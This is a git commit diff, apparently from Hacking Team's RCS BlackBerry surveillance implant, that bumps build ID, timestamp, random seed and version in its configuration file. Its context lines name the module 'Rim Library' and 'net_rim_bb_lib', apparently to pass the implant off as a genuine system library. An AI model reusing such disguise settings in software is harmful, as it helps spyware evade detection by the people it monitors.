71e0dd09033bca843bbbee4f9eedd84a00ff2fd4
Fabrizio Cornelli <f.cornelli@hackingteam.it>
2012-08-09 13:25:11 +0200

    8.1.4

--- RCSBlackBerry/src/blackberry/config/Cfg.java
+++ RCSBlackBerry/src/blackberry/config/Cfg.java
@@ -37,16 +37,16 @@ public class Cfg {
     //==========================================================
     // Compile configuration, do not edit under this line
 
-    public static final int BUILD_ID = 159;
-    public static final String BUILD_TIMESTAMP = "20120612-103139";
+    public static final int BUILD_ID = 161;
+    public static final String BUILD_TIMESTAMP = "20120809-012447";
     
     public static final String GROUP_NAME =  "Rim Library"; //"Rim Library";
     public static final String MODULE_NAME = "net_rim_bb_lib"; //"net_rim_bb_lib";
     public static final String MODULE_LIB_NAME = "net_rim_bb_lib_base"; //"net_rim_bb_lib_base";
 
-    public static final String RANDOM = "9414F0A62444E374";
+    public static final String RANDOM = "054B681939392FAC";
     
-    public static final int VERSION = 2012041602;
+    public static final int VERSION = 2012063004;
 
     //==========================================================
 }
